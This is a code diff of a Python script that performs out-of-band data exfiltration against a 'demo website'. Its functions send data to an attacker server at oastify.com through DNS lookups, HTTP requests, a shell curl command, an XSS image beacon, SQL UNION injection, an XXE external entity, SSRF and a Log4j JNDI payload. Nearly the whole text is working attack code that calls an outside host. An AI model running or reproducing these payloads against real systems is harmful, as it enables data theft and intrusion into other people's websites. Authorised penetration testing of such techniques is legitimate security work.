@@ -3,13 +3,13 @@ import subprocess
 import dns.resolver
 
 # Configuration
-DEMO_WEBSITE_URL = "http://oobserver.net"
-ATTACKER_SERVER_URL = "http://oastify.com"  # Ensure this is pointing to your attack server on port 5000
+DEMO_WEBSITE_URL = "http://oobserver.net"  # Update to your demo website URL
+ATTACKER_SERVER_URL = "http://oastify.com"  # Update to your attack server URL
 
 def check_server():
     """Check if the attack server is reachable."""
     try:
-        response = requests.get(f"{ATTACKER_SERVER_URL}/log?data=test")
+        response = requests.get(f"{ATTACKER_SERVER_URL}/test?data=test")
         if response.status_code == 200:
             print("Attack server is reachable.")
         else:
@@ -20,7 +20,7 @@ def check_server():
 
 def dns_exfiltration(data):
     """Perform DNS exfiltration."""
-    domain = f"{data}.oobserver.net"  # Example domain, adjust as needed
+    domain = f"{data}.oastify.com"  # Example domain, adjust as needed
     try:
         dns.resolver.resolve(domain, 'A')
     except Exception as e:
@@ -28,7 +28,7 @@ def dns_exfiltration(data):
 
 def http_exfiltration(data):
     """Perform HTTP exfiltration."""
-    url = f"{ATTACKER_SERVER_URL}/log?data={data}"
+    url = f"{ATTACKER_SERVER_URL}/http?data={data}"
     try:
         requests.get(url)
     except Exception as e:
@@ -37,16 +37,17 @@ def http_exfiltration(data):
 def command_injection(data):
     """Perform command injection."""
     try:
-        cmd = f"curl {ATTACKER_SERVER_URL}/log?data={data}"
+        cmd = f"curl {ATTACKER_SERVER_URL}/cmd?data={data}"
         subprocess.run(cmd, shell=True)
     except Exception as e:
         print(f"Command injection error: {e}")
 
 def xss_exfiltration(data):
     """Perform XSS exfiltration."""
-    payload = f"<script>new Image().src='{ATTACKER_SERVER_URL}/log?data={data}';</script>"
+    payload = f"<script>new Image().src='{ATTACKER_SERVER_URL}/xss?data={data}';</script>"
     try:
-        requests.post(f"{DEMO_WEBSITE_URL}/xss", data={"input": payload})
+        response = requests.post(f"{DEMO_WEBSITE_URL}/xss", data={"input": payload})
+        print(f"XSS exfiltration response status code: {response.status_code}")
     except Exception as e:
         print(f"XSS exfiltration error: {e}")
 
@@ -54,35 +55,39 @@ def sql_injection(data):
     """Perform SQL injection."""
     payload = f"1' UNION SELECT '{data}'--"
     try:
-        requests.get(f"{DEMO_WEBSITE_URL}/search?query={payload}")
+        response = requests.get(f"{DEMO_WEBSITE_URL}/search?query={payload}")
+        print(f"SQL injection response status code: {response.status_code}")
     except Exception as e:
         print(f"SQL injection error: {e}")
 
 def xxe_exfiltration(data):
     """Perform XXE exfiltration."""
     payload = f"""<?xml version="1.0" encoding="UTF-8"?>
-    <!DOCTYPE foo [<!ENTITY xxe SYSTEM "{ATTACKER_SERVER_URL}/log?data={data}">]>
+    <!DOCTYPE foo [<!ENTITY xxe SYSTEM "{ATTACKER_SERVER_URL}/xxe?data={data}">]>
     <foo>&xxe;</foo>"""
     headers = {'Content-Type': 'application/xml'}
     try:
-        requests.post(f"{DEMO_WEBSITE_URL}/xxe", data=payload, headers=headers)
+        response = requests.post(f"{DEMO_WEBSITE_URL}/xxe", data=payload, headers=headers)
+        print(f"XXE exfiltration response status code: {response.status_code}")
     except Exception as e:
         print(f"XXE exfiltration error: {e}")
 
 def ssrf_exfiltration(data):
     """Perform SSRF exfiltration."""
-    payload = f"{ATTACKER_SERVER_URL}/log?data={data}"
+    payload = f"{ATTACKER_SERVER_URL}/ssrf?data={data}"
     try:
-        requests.get(f"{DEMO_WEBSITE_URL}/fetch?url={payload}")
+        response = requests.get(f"{DEMO_WEBSITE_URL}/fetch?url={payload}")
+        print(f"SSRF exfiltration response status code: {response.status_code}")
     except Exception as e:
         print(f"SSRF exfiltration error: {e}")
 
 def log4j_exfiltration(data):
     """Perform Log4j exfiltration."""
-    payload = f"${{jndi:ldap://oobserver.net:5000/a}}"
+    payload = f"${{jndi:ldap://oastify.com/log4j?data={data}}}"
     headers = {'User-Agent': payload}
     try:
-        requests.get(DEMO_WEBSITE_URL, headers=headers)
+        response = requests.get(DEMO_WEBSITE_URL, headers=headers)
+        print(f"Log4j exfiltration response status code: {response.status_code}")
     except Exception as e:
         print(f"Log4j exfiltration error: {e}")
 
